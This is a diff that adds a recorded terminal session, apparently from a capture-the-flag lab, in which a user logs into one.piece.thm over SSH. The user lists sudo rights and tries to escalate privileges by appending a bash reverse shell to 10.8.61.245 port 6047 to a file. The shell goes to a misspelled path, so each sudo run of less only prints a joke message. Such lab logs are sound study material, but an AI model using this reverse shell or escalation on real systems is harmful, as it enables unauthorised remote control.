@@ -1,0 +1,53 @@
+Script started on 2025-04-11 15:27:42+03:00 [COMMAND="ssh 7uffy_vs_T3@ch@one.piece.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+7uffy_vs_T3@ch@one.piece.thm's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-041500-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+18 packages can be updated.
+13 updates are security updates.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ sudo -l
+[sudo] password for 7uffy_vs_T3@ch: 
+Matching Defaults entries for 7uffy_vs_T3@ch on Laugh-Tale:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:
+    (ALL) /usr/local/bin/less
+]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ sudo [K[K[K[K[Ksudo less /etc/profile
+Sorry, I can't tell you where is the One Piece
+]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ echo "/bin/bash -i >& /dev/tcp/10.8.61.245/6047 0>&1" >> /usr/local/bin/lesss
+]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ sudo /usr/local/bin/less
+Sorry, I can't tell you where is the One Piece
+
+^C]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ sudo /usr/local/bin/less
+Sorry, I can't tell you where is the One Piece
+]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ sudo /usr/local/bin/less
+Sorry, I can't tell you where is the One Piece
+]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ sudo /usr/local/bin/less
+Sorry, I can't tell you where is the One Piece
+]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ sudo /usr/local/bin/less
+Sorry, I can't tell you where is the One Piece
+^C]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ sudo /usr/local/bin/less
+Sorry, I can't tell you where is the One Piece
+^C]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ sudo /usr/local/bin/less
+Sorry, I can't tell you where is the One Piece
+]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ sudo /usr/local/bin/less
+Sorry, I can't tell you where is the One Piece
+]0;7uffy_vs_T3@ch@Laugh-Tale: ~[01;32m7uffy_vs_T3@ch@Laugh-Tale[00m:[01;34m~[00m$ exit
+logout
+Connection to one.piece.thm closed.
+
+Script done on 2025-04-11 15:46:03+03:00 [COMMAND_EXIT_CODE="0"]
